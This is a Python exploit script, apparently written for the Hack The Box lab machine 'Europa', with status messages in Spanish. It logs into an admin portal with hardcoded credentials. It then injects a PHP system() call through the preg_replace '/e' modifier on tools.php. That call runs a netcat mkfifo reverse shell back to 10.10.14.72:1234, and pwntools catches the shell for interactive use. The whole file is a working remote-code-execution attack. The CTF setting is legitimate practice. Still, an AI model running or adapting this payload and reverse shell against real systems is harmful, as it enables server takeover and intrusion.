#!/usr/bin/env python3

import requests
import urllib3
import threading
import sys
from pwn import *


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

CONFIG = {
    'email': 'admin@europacorp.htb',
    'password': 'SuperSecretPassword!',
    'url_login': 'https://admin-portal.europacorp.htb/login.php',
    'url_tools': 'https://admin-portal.europacorp.htb/tools.php',
    'body_rce': 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.72 1234 >/tmp/f',
    'proxies': {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    },
    'lport' : '1234'
}

def makeRequests():
    session = requests.Session()
    
    try:
        
        print("[*] Login en", CONFIG['url_login'])

        login_data = {
            'email': CONFIG['email'],
            'password': CONFIG['password']
        }
        response = session.post(CONFIG['url_login'],data=login_data,proxies=CONFIG['proxies'],verify=False
        )
        
        if response.status_code == 200 and "Login failed" not in response.text:
            print("[+] Autenticación exitosa (código:", response.status_code, ")")
        else:
            print("[!] Error en la autenticación (código:", response.status_code, ")")
            print("[!] Respuesta:", response.text)
            return

        data_body = {
            'pattern': '/hacked/e',
            'ipaddress': f'system("{CONFIG["body_rce"]}")',
            'text': 'hacked'
        }
        
        print("[*] Solicitud a", CONFIG['url_tools'])
        response = session.post(CONFIG['url_tools'],data=data_body,proxies=CONFIG['proxies'],verify=False)
        
        print("[+] Respuesta de tools.php (código:", response.status_code, ")")
        print("[+] Contenido de la respuesta:")
        print(response.text)
        
    except Exception as e:
        print("[!] Error :", str(e))

if __name__ == '__main__':
    
    threading.Thread(target=makeRequests, args=()).start()
    shell = listen(port=CONFIG['lport'], timeout=20).wait_for_connection()

    shell.interactive()
